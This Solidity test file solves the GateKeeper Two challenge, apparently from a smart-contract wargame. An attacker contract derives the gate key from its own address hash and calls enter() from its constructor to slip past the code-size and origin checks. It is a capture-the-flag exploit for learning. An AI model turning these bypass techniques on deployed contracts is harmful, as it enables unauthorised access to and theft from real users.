// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {GateKeeperTwo} from "../src/GateKeeperTwo.sol";

contract GateKeeperTwoAttacker {
    // Bypass gateTwo: extcodesize(msg.sender) is 0 while a contract is still inside its constructor
    constructor(GateKeeperTwo _gateKeeperTwo) {
        bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));

        // Bypass gateOne: calling from this contract ensures msg.sender != tx.origin
        _gateKeeperTwo.enter(key);
    }
}

contract GateKeeperTwoTest is Test {
    GateKeeperTwo public gateKeeperTwo;

    // Trigger the new exploit
    function setUp() public {
        gateKeeperTwo = new GateKeeperTwo();
    }

    function test_GateKeepTwoExploit() public {
        // Simulate an external EOA intiating the transaction
        address attacker = makeAddr("attacker");
        vm.startPrank(msg.sender, attacker);

        // Deploying the attacker contract executes the exploit immeddiately in its constructor
        new GateKeeperTwoAttacker(gateKeeperTwo);

        // Verify the attacker EOA was registered as the new entrant
        assertEq(gateKeeperTwo.entrant(), attacker);
    }
}
